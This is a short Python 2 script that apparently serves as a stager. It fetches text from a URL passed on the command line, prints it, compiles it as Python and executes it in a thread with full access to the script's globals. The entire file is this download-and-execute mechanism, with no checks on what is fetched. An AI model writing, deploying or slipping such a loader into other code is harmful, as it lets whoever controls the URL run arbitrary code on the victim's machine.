import urllib2, sys
from threading import Thread

retries = 5
url = sys.argv[1]

def exec_ (m ) :
	exec (m, globals())
	sys.exit(0)

for i in range(retries) :
	response = urllib2.urlopen( url )
	try :
		html = response.read()
	except :
		continue
	print html
	compiled_stage = compile(html, '<string>', 'exec')
	thr = Thread( target = exec_, args = (compiled_stage,) )
	thr.start()

	break


thr.join()
